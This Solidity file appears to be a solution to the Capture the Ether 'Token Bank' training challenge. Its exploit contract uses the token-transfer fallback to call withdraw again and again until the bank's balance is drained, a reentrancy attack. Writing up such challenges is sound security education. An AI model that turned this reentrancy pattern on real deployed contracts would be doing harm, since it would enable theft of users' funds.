pragma solidity ^0.8.0;

//based on: https://cmichel.io/capture-the-ether-solutions/

abstract contract ISimpleERC223Token {
    mapping(address => uint256) public balanceOf;
    function transfer(address to, uint256 value) virtual public returns (bool success);
}

abstract contract ITokenBankChallenge {
    ISimpleERC223Token public token;
    function withdraw(uint256 amount) virtual public;
    function isComplete() virtual public view returns (bool);
}

contract TokenBankExploit {

    ITokenBankChallenge challenge;
    address tokenBankAddress;

    constructor(address _tokenBankAddress){
        tokenBankAddress = _tokenBankAddress;
        challenge = ITokenBankChallenge(tokenBankAddress);
    }

    function deposit() external payable {
        uint256 myBalance = challenge.token().balanceOf(address(this));
        // deposit is handled in challenge's tokenFallback
        challenge.token().transfer(address(challenge), myBalance);
    }

    function tokenFallback(address _from, uint _value, bytes calldata _data) public{
        if(_from != tokenBankAddress){
            return;
        }

        if(challenge.token().balanceOf(tokenBankAddress) > 0){
            challenge.withdraw(500000 * 10**18);
        }
    }

    function exploit() external {
        challenge.withdraw(500000 * 10**18);
        require(challenge.isComplete(), "challenge not completed");
    }
}
